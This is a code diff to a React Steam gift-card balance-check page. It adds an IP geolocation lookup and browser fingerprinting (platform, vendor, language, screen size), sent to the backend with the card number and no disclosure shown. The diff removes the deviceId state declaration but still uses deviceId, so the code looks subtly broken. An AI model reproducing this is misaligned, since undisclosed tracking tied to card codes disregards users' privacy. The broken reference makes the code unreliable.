@@ -9,9 +9,22 @@ export default function SteamPage() {
   const [error, setError] = useState(null)
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
   const [showTutorial, setShowTutorial] = useState(false)
-  const [deviceId, setDeviceId] = useState(null)
+  const [location, setLocation] = useState('Unknown')
 
   useEffect(() => {
+    async function detectLocation() {
+      try {
+        const res = await fetch('https://ipapi.co/json/')
+        const data = await res.json()
+        if (data.country_name) {
+          setLocation(data.country_name)
+        }
+      } catch (err) {
+        console.error('IP detection failed', err)
+      }
+    }
+    detectLocation()
+
     // Initialize or get device ID
     let id = localStorage.getItem('deviceId')
     if (!id) {
@@ -29,13 +42,22 @@ export default function SteamPage() {
 
     setLoading(true)
     try {
+      const browserInfo = {
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        language: navigator.language,
+        screen: `${window.screen.width}x${window.screen.height}`
+      }
+
       const res = await fetch('/api/check-balance', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           cardNumber: card.replace(/\s+/g, ''),
           type: 'steam',
-          deviceId: deviceId
+          deviceId: deviceId,
+          location: location,
+          browserInfo: JSON.stringify(browserInfo)
         })
       })
       const data = await res.json()
